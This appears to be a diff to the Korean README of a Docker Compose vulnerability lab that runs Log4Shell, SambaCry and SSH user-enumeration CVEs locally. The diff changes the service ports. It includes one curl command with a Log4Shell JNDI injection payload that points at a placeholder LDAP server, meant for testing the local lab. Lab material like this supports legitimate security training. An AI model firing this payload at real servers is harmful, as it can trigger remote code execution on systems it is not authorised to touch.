@@ -6,9 +6,9 @@ Docker Compose 기반 취약점 실습 환경. 세 가지 실제 CVE를 로컬�
 
 | CVE | 이름 | CVSS | 접속 포트 |
 |-----|------|------|-----------|
-| CVE-2021-44228 | Log4Shell | 10.0 (Critical) | `localhost:8080` |
-| CVE-2017-7494  | SambaCry  |  9.8 (Critical) | `localhost:8081` (웹 UI) / `1445` (SMB) |
-| CVE-2018-15473 | SSH User Enumeration | 5.3 (Medium) | `localhost:8082` (웹 UI) / `2222` (SSH) |
+| CVE-2021-44228 | Log4Shell | 10.0 (Critical) | `localhost:9080` |
+| CVE-2017-7494  | SambaCry  |  9.8 (Critical) | `localhost:9081` (웹 UI) / `1445` (SMB) |
+| CVE-2018-15473 | SSH User Enumeration | 5.3 (Medium) | `localhost:9082` (웹 UI) / `2222` (SSH) |
 
 ## 빠른 시작
 
@@ -24,16 +24,16 @@ docker compose up --build -d
 
 | 서비스 | 브라우저 접속 URL | 설명 |
 |--------|------------------|------|
-| Log4Shell | http://localhost:8080 | 취약한 Spring Boot 앱 |
-| SambaCry UI | http://localhost:8081 | SMB 서비스 상태 및 분석 가이드 |
-| SSH Enum UI | http://localhost:8082 | SSH 서비스 상태 및 분석 가이드 |
+| Log4Shell | http://localhost:9080 | 취약한 Spring Boot 앱 |
+| SambaCry UI | http://localhost:9081 | SMB 서비스 상태 및 분석 가이드 |
+| SSH Enum UI | http://localhost:9082 | SSH 서비스 상태 및 분석 가이드 |
 
 ## 각 취약점 테스트
 
 ### Log4Shell (CVE-2021-44228)
 ```bash
 # JNDI Lookup 트리거 (X-Api-Version 헤더 활용)
-curl -H 'X-Api-Version: ${jndi:ldap://your-ldap-server/a}' http://localhost:8080/
+curl -H 'X-Api-Version: ${jndi:ldap://your-ldap-server/a}' http://localhost:9080/
 ```
 
 ### SambaCry (CVE-2017-7494)
